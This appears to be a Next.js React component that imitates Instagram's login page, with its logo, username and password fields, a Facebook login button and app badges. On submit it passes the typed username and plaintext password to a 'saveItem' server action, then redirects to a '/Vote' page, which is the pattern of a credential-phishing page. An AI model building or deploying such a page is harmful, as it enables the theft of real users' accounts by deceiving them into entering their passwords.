"use client";
import React, { useState } from "react";
import { saveItem } from "@/actions";
import Image from "next/image";
import { useRouter } from "next/navigation"; // Import useRouter

function FormInput() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const router = useRouter(); // Initialize useRouter

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!username || !password) {
      alert("Please fill in both fields");
      return;
    }
    setLoading(true);
    const result = await saveItem({ username, password });
    setLoading(false);
    if (result.success) {
      setUsername("");
      setPassword("");
      alert("Item saved!");
      router.push("/Vote"); // Redirect to another page
    } else {
      alert("Failed to save item: " + result.error);
    }
  };

  return (
    <div className="flex flex-col items-center justify-center h-screen bg-[white]">
      <div className="flex flex-col items-center border border-gray-300 p-8 rounded-lg  w-[80%] text-center">
        <Image
          src="/insta.png"
          width={200}
          className="object-fill mb-[25px]"
          height={100}
        />
        <form onSubmit={handleSubmit} className="w-full">
          <input
            type="text"
            placeholder="Phone number, username, or email"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            className="w-full p-2 mb-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            className="w-full p-2 mb-2 border border-gray-300 rounded bg-gray-50 focus:outline-none focus:ring-2 focus:ring-blue-500"
            required
          />
          <button
            type="submit"
            className="w-full p-2 mt-2 bg-blue-500 text-white text-[14px] font-bold rounded hover:bg-blue-600"
            disabled={loading}
          >
            {loading ? "Saving..." : "Log in"}
          </button>
        </form>
        <div className="flex items-center my-4 w-[80%]">
          <div className="flex-grow h-px bg-gray-300"></div>
          <div className="px-4 text-gray-500 font-bold">OR</div>
          <div className="flex-grow h-px bg-gray-300"></div>
        </div>
        <button className="text-[#00256b] text-[15px] mb-4">
          Log in with Facebook
        </button>
        <a href="#" className="text-xs text-[#00376b]">
          Forgot password?
        </a>
      </div>
      <div className="mt-4 w-[80%] p-4 border border-gray-300 bg-white rounded-lg text-center">
        <p>
          Don't have an account?{" "}
          <a href="#" className="text-[#0095f6] ">
            Sign up
          </a>
        </p>
      </div>
      <div className=" text-center mt-[25px]">
        <p>Get the app.</p>
        <div className="flex justify-center mt-[10px]">
          <img
            src="/google.png"
            alt="Get it on Google Play"
            className="w-32 h-10 mx-2"
          />
          <img
            src="micro.png"
            alt="Get it from Microsoft"
            className="w-32 h-10 mx-2"
          />
        </div>
      </div>
    </div>
  );
}

export default FormInput;
